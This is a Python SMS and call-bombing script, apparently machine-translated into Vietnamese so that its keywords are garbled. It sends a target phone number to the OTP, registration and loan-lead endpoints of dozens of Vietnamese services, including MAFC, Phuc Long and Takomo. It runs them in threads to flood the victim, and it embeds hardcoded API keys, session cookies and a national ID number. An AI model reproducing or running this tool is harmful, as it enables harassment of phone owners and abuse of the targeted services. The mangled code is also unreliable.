        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 giống Mac OS X) AppleWebKit/605.1.15 (KHTML, giống Gecko) Phiên bản/16.6 Mobile/15E148 Safari/604.1 Edg/127.0.0.0',
    }

    dữ liệu json = {
        'usersName': 'tannguyen',
        'mật khẩu': 'mafc123!',
        'thu nhập': 0,
        'currAddress': 'Tp.Hcm',
        'phoneNbr': sdt,
        'nationalId': '034201009872',
        'typeCreate': 'API',
        'tên': generate_random_name(),
        'allowQualified': 'Y',
        'email': 'b45b93f099',
        'mã giới thiệu': '',
        'tuổi': '1992',
        'vendorCode': 'INTERNAL_MKT',
        'msgName': 'creatlead',
        'priAddress': 'null',
        'chiến dịch': 'null',
        'adsGroupName': 'null',
        'adsName': 'null',
        'paramInfo': '',
        'mktCode': 'null',
        'consentNd13': 'Y',
    }

    phản hồi = yêu cầu.đăng(
        'https://mafc.com.vn/wp-content/themes/vixus/vaytiennhanhnew/api.php',
        cookie=cookie,
        headers=tiêu đề,
        json=dữ liệu json,
    )



def send_otp_via_phuclong(sdt):

    tiêu đề = {
        'chấp nhận': '*/*',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'ủy quyền': 'Người mang không xác định',
        'kiểu-nội-dung': 'ứng-dụng/json',
        'dnt': '1',
        'nguồn gốc': 'https://order.phuclong.com.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://order.phuclong.com.vn/',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cross-site',
        'user-agent': 'Mozilla/5.0 (iPhone; CPU iPhone OS 16_6 giống Mac OS X) AppleWebKit/605.1.15 (KHTML, giống Gecko) Phiên bản/16.6 Mobile/15E148 Safari/604.1 Edg/127.0.0.0',
        'x-api-key': 'bca14340890a65e5adb04b6fd00a75f264cf5f57e693641f9100aefc642461d3',
    }

    # Dữ liệu JSON cho yêu cầu đầu tiên
    json_data_check = {
        'tên người dùng': sdt,
    }

    # JSON dữ liệu cho thứ hai yêu cầu
    json_data_register = {
        'số điện thoại': sdt,
        'fullName': tạo_tên_ngẫu_nhiên(),
        'email': 'th456do1g110@hotmail.com',
        'mật khẩu': 'Nqnt7%@hf3',
    }

    # Gửi yêu cầu đầu tiên
    response_check = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/check', headers=headers, json=json_data_check)
    

    # Gửi yêu cầu thứ hai
    response_register = requests.post('https://api-crownx.winmart.vn/as/api/plg/v1/user/register', headers=headers, json=json_data_register)
    


###################################################### ########################################## ###################################################### ##########################################
###################################################### ########################################## ###################################################### ##########################################
###################################################### ########################################## ###################################################### ##########################################
###################################################### ########################################## ###################################################### ##########################################
###################################################### ########################################## ###################################################### ##########################################
###################################################### ########################################## ###################################################### ##########################################
###################################################### ########################################## ###################################################### ##########################################
###################################################### ########################################## ###################################################### ##########################################

###################################################### ########################################## ###################################################### ##########################################

def send_otp_via_takomo(sdt):

    bánh quy = {
        '__sbref': 'mkmvwcnohbkannbumnilmdikhgdagdlaumjfsexo',
        '_cabinet_key': 'SFMyNTY.g3QAAAACbQAAABBvdHBfbG9naW5fcGFzc2VkZAAFZmFsc2VtAAAABXBob25lbQAAAAs4NDM5NTI3MTQwMg._Opxk3aYQEWoonHoIgUhbhOxUx_9BtdySPUqwzWA9C0',
    }

    # Cấu hình headers chung
    tiêu đề_lấy = {
        'chấp nhận': 'văn bản/html,ứng dụng/xhtml+xml,ứng dụng/xml;q=0.9,hình ảnh/avif,hình ảnh/webp,hình ảnh/apng,*/*;q=0.8,ứng dụng/trao đổi đã ký;v=b3;q=0.7',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'dnt': '1',
        'nếu-không-phù-hợp': '"849a8-lcHURUguRbzDBoYBR3u76kp0LTU"',
        'ưu tiên': 'u=0, i',
        'người giới thiệu': 'https://takomo.vn/',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'tài liệu',
        'sec-fetch-mode': 'điều hướng',
        'sec-fetch-site': 'cùng một trang web',
        'sec-fetch-user': '?1',
        'yêu cầu nâng cấp không an toàn': '1',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    tiêu đề_bài_đăng = {
        'chấp nhận': 'ứng dụng/json, văn bản/thuần túy, */*',
        'ngôn ngữ chấp nhận': 'vi,en-US;q=0.9,en;q=0.8',
        'content-type': 'application/json;charset=UTF-8',
        'dnt': '1',
        'nguồn gốc': 'https://lk.takomo.vn',
        'ưu tiên': 'u=1, i',
        'người giới thiệu': 'https://lk.takomo.vn/?phone={sdt}&amount=2000000&term=7&utm_source=pop_up&utm_medium=organic&utm_campaign=direct_takomo&utm_content=mainpage_popup_login',
        'sec-ch-ua': '"Không) Thương hiệu";v="99", "Microsoft Edge";v="127", "Chromium";v="127"',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '"Windows"',
        'sec-fetch-dest': 'trống',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'cùng nguồn gốc',
        'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, giống như Gecko) Chrome/127.0.0.0 Safari/537.36 Edg/127.0.0.0',
    }

    # Thực hiện yêu cầu GET
    tham số = {
        'điện thoại': sdt,
        'số tiền': '2000000',
        'thuật ngữ': '7',
        'utm_source': 'pop_up',
        'utm_medium': 'hữu cơ',
        'utm_campaign': 'direct_takomo',
        'utm_content': 'mainpage_popup_login',
    }

    response_get = requests.get('https://lk.takomo.vn/', params=params, cookies=cookies, headers=headers_get)

    

    # Thực hiện yêu cầu POST
    dữ liệu json = {
        'dữ liệu': {
            'điện thoại': sdt,
            'mã': 'gửi lại',
            'kênh': 'ivr',
        },
    }

    response_post = requests.post('https://lk.takomo.vn/api/4/client/otp/send', cookies=cookies, headers=headers_post, json=json_data)

    
###################################################### ########################################## ###################################################### ##########################################
###################################################### ########################################## ###################################################### ##########################################
###################################################### ########################################## ###################################################### ##########################################
###################################################### ########################################## ###################################################### ##########################################
###################################################### ########################################## ###################################################### ##########################################
###################################################### ########################################## ###################################################### ##########################################
###################################################### ########################################## ###################################################### ##########################################
###################################################### ########################################## ###################################################### ##########################################

###################################################### ########################################## ###################################################### ##########################################











def send_otp_with_delay(func, phone, delay):
    time.sleep(trì hoãn)
    chức năng(điện thoại)

# Điện thoại di động của người dùng được yêu cầu
phone = input(f"{vua}Nhập số điện thoại: {vang}")
nếu điện thoại == "0794268460":
    print(f"{vua}Không Nên Làm Như Thế")
    ra()
delay = float(input(f"{vua}Nhập Delay Giữa Các Tin Nhắn: {vang}"))
print(f"{vua}Đang Chạy....")
ngủ(3)
print(f"{vua}Chạy Ẩn Để Cho Khỏi Văn Máy Máy")
print(f"{vua}Đang Bắt Đầu Chạy Spam Sms + Cuộc Gọi")

# Tạo danh sách các hàm OTP
otp_functions = [
    gửi_otp_qua_sapo, gửi_otp_qua_viettel, gửi_otp_qua_medicare, gửi_otp_qua_tv360,
    gửi_otp_qua_dienmayxanh, gửi_otp_qua_kingfoodmart, gửi_otp_qua_mocha, gửi_otp_qua_fptdk,
    gửi_otp_qua_fptmk, gửi_otp_qua_VIEON, gửi_otp_qua_ghn, gửi_otp_qua_lottemart,
    gửi_otp_qua_DONGCRE, gửi_otp_qua_shopee, gửi_otp_qua_TGDD, gửi_otp_qua_fptshop,
    gửi_otp_qua_WinMart, gửi_otp_qua_vietloan, gửi_otp_qua_lozi, gửi_otp_qua_F88,
    gửi_otp_qua_spacet, gửi_otp_qua_vinpearl, gửi_otp_qua_traveloka, gửi_otp_qua_dongplus,
    gửi_otp_qua_longchau, gửi_otp_qua_longchau1, gửi_otp_qua_galaxyplay, gửi_otp_qua_emartmall,
    send_otp_via_ahamove, send_otp_via_viettelMoney, send_otp_via_xanhsmsms, send_otp_via_xanhsmzalo,
    gửi_otp_qua_popeyes, gửi_otp_qua_ACHECKIN, gửi_otp_qua_APPOTA, gửi_otp_qua_Watsons,
    gửi_otp_qua_hoangphuc, gửi_otp_qua_fmcomvn, gửi_otp_qua_Reebokvn, gửi_otp_qua_thefaceshop,
    gửi_otp_qua_BEAUTYBOX, gửi_otp_qua_winmart, gửi_otp_qua_medicare, gửi_otp_qua_futabus,
    gửi_otp_qua_ViettelPost, gửi_otp_qua_myviettel2, gửi_otp_qua_myviettel3, gửi_otp_qua_TOKYOLIFE,
    gửi_otp_qua_30shine, gửi_otp_qua_Cathaylife, gửi_otp_qua_dominos, gửi_otp_qua_vinamilk,
    gửi_otp_qua_vietloan2, gửi_otp_qua_batdongsan, gửi_otp_qua_GUMAC, gửi_otp_qua_mutosi,
    gửi_otp_qua_mutosi1, gửi_otp_qua_vietair, gửi_otp_qua_FAHASA, gửi_otp_qua_hopiness,
    gửi_otp_qua_modcha35, gửi_otp_qua_Bibabo, gửi_otp_qua_MOCA, gửi_otp_qua_pantio,
    gửi_otp_qua_Routine, gửi_otp_qua_vayvnd, gửi_otp_qua_tima, gửi_otp_qua_moneygo,
    gửi_otp_qua_takomo, gửi_otp_qua_pico, gửi_otp_qua_PNJ, gửi_otp_qua_TINIWORLD,
    gửi_otp_qua_BACHHOAXANH, gửi_otp_qua_takomo, gửi_otp_qua_mafccomvn, gửi_otp_qua_phuclong

]

# Tạo luồng cho mỗi hàm OTP
chủ đề = []
đối với func trong otp_functions:
    luồng = luồng.Luồng(mục tiêu=send_otp_with_delay, đối số=(func, phone, delay))
    threads.append(thread)

# Bắt đầu các luồng
cho luồng trong luồng:
    thread.bắt đầu()

# Chờ đợi các luồng hoàn thành
cho luồng trong luồng:
    thread.join()




# https://www.sapo.vn
# https://viettel.vnx3
# https://medicare.vn
# https://tv360.vn
# https://www.dienmayxanh.com
# https://kingfoodmart.com/
# https://video.mocha.com.vn
# https://fptplay.vn x2 1 cái quên pass 1 cái tạo acc
# https://vieon.vn/
# https://sso.ghn.vn/đăng ký
# https://www.lottemart.vn/
# https://vayvnd.vn/
# https://shopee.vn/
#https://www.thegioididong.com
# https://fptshop.com.vn
# https://winmart.vn/
# https://vietloan.vn
# https://lozi.vn
# https://f88.vn
# https://lozi.vn/
# https://spacet.vn/
#https://booking.vinpearl.com/
# https://www.traveloka.com
# https://dongplus.vn
#https://nhathuoclongchau.com.vn
# https://galaxyplay.vn/
# https://emartmall.com.vn/
# https://app.ahamove.com
#viettelpay.vn #lấy api qua app
#https://www.taxixanhsm.vn #lấy api qua app x2 làm cả zalo và sms
# https://id.acheckin.vn/ #1
# https://appota.com/
# tải ở ứng dụng Watsons VN
# https://hoang-phuc.com/
#fm.com.vn
# https://reebok.com.vn/
# https://thefaceshop.com.vn/
# https://beautybox.com.vn/
# https://winmart.vn/
# https://medicare.vn/login#
#https://futabus.vn/dang-nhap
# https://viettelpost.com.vn/
# https://tokyolife.vn/#
# https://30shine.com/
#https://www.cathaylife.com.vn
# https://dominos.vn
# https://new.vinamilk.com.vn
#gửi_otp_qua_vietloan2 #vietloan.vn
# https://batdongsan.com.vn
# https://gumac.vn
# https://mutosi.com/
# https://vietair.com.vn/
# https://www.fahasa.com/
# https://shopiness.vn/
# mocha35 có ở ứng dụng
# bibabo.vn tải ứng dụng
#moca.vn
#pantio.vn
# https://routine.vn/
# https://vayvnd.vn/
# https://moneygo.vn/
#https://pico.vn
# https://www.pnj.com.vn/
# https://prod-tini-id.nkidworks.com/auth/tinizen